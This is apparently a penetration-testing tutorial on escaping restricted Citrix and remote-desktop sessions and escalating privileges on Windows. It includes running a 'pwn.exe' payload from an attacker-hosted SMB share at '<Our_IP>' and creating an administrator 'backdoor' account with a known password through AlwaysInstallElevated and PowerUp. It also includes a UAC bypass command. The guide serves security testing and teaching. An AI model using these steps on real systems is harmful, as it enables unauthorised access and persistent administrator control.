# Citrix Breakout

In this section will cover: **Citrix Breakout**

## Citrix Breakout

Numerous organizations leverage virtualization platforms such as Terminal Services, Citrix, AWS AppStream, CyberArk PSM and Kiosk to offer remote access solutions in order to meet their business requirements. However, in most organizations "lock-down" measures are implemented in their desktop environments to minimize the potential impact of malicious staff members and compromised accounts on overall domain security. While these desktop restrictions can impede threat actors, there remains a possibility for them to "break-out" of the restricted environment.

Basic Methodology for break-out:
- Gain access to a Dialog Box.
- Exploit the Dialog Box to achieve command execution.
- Escalate privileges to gain higher levels of access.

In certain environments, where minimal hardening measures are implemented, there might even be a standard shortcut to cmd.exe in the Start Menu, potentially aiding in unauthorized access. However, in a highly restrictive lock-down environment, any attempts to locate "cmd.exe" or "powershell.exe" in the start menu will yield no results. Similarly, accessing C:\Windows\system32 through File Explorer will trigger an error, preventing direct access to critical system utilities. Acquiring access to the "CMD/Command Prompt" in such a restricted environment represents a notable achievement, as it provides extensive control over the Operating System. This level of control empowers an attacker to gather valuable information, facilitating the further escalation of privileges.

**Bypassing Path Restrictions**

When we attempt to visit C:\Users using File Explorer, we find it is restricted and results in an error. This indicates that group policy has been implemented to restrict users from browsing directories in the C:\ drive using File Explorer. In such scenarios, it is possible to utilize windows dialog boxes as a means to bypass the restrictions imposed by group policy. Once a Windows dialog box is obtained, the next step often involves navigating to a folder path containing native executables that offer interactive console access (i.e.: cmd.exe). Usually, we have the option to directly enter the folder path into the file name field to gain access to the file.

Numerous desktop applications deployed via Citrix are equipped with functionalities that enable them to interact with files on the operating system. Features like Save, Save As, Open, Load, Browse, Import, Export, Help, Search, Scan, and Print, usually provide an attacker with an opportunity to invoke a Windows dialog box. There are multiple ways to open dialog box in windows using tools such as Paint, Notepad, Wordpad, etc. We will cover using MS Paint as an example for this section.

Example Paint
````
# Paint

# Step 1 -  File > Open
# Step 2 - In file Name field with All Files: \\127.0.0.1\c$\users\<user>\Directory
````
Accessing SMB share from restricted environment
````
# Step 1 - Create SMB server
$ impacket-smbserver -smb2support share $(pwd)

# Step 2 - Navigate to the "File" menu and select "Open"

# Step 3 - In file Name with All Files: \\<Our_IP>\share

# Step 4 - Press <Enter> and Verify if all files are there

# Step 5 - Right-click on the pwn.exe binary and select Open
````

**Alternate Explorer**

In cases where strict restrictions are imposed on File Explorer, alternative File System Editors like Q-Dir or Explorer++ can be employed as a workaround. These tools can bypass the folder restrictions enforced by group policy, allowing users to navigate and access files and directories that would otherwise be restricted within the standard File Explorer environment.
````
# Step 1 - Create SMB server
$ impacket-smbserver -smb2support share $(pwd)

# Step 2 - Navigate to the "File" menu and select "Open"

# Step 3 - In file Name with All Files: \\<Our_IP>\share

# Step 4 - Press <Enter> and Verify if all files are there

# Step 5 - Right-click on the Explorer++.exe binary and select Open
````

**Modify existing shortcut file**

Unauthorized access to folder paths can also be achieved by modifying existing Windows shortcuts and setting a desired executable's path in the Target field.

The following steps outline the process:
- Right-click the desired shortcut.
- Select Properties.
- Within the Target field, modify the path to the intended folder for access. (C:\Windows\System32\cmd.exe)
- Execute the Shortcut and cmd will be spawned

**Script Execution**

When script extensions such as .bat, .vbs, or .ps are configured to automatically execute their code using their respective interpreters, it opens the possibility of dropping a script that can serve as an interactive console or facilitate the download and launch of various third-party applications which results into bypass of restrictions in place. This situation creates a potential security vulnerability where malicious actors could exploit these features to execute unauthorized actions on the system.
- Create a new text file and name it "evil.bat".
- Open "evil.bat" with a text editor such as Notepad.
- Input the command "cmd" into the file.
- Save the file.

## Escalating Privileges

Once access to the command prompt is established, it's possible to search for vulnerabilities in a system more easily. For instance, tools like Winpeas and PowerUp can also be employed to identify potential security issues and vulnerabilities within the operating system.

Using PowerUp.ps1, we find that Always Install Elevated key is present and set.

We can also validate this using the Command Prompt by querying the corresponding registry keys:
````
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1

> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1
````
Once more, we can make use of PowerUp, using it's Write-UserAddMSI function. This function facilitates the creation of an .msi file directly on the desktop.
````
> Import-Module .\PowerUp.ps1
> Write-UserAddMSI
# Will create UserAdd.msi
````
Now we can execute UserAdd.msi and create a new user backdoor:T3st@123 under Administrators group. Note that giving it a password that doesn’t meet the password complexity criteria will throw an error.
````
> runas /user:backdoor cmd

Enter the password for backdoor: T3st@123
Attempting to start cmd as user "VDESKTOP3\backdoor" ..
````

**Bypassing UAC**

````
https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC
> Import-Module .\Bypass-UAC.ps1
> Bypass-UAC -Method UacMethodSysprep
````
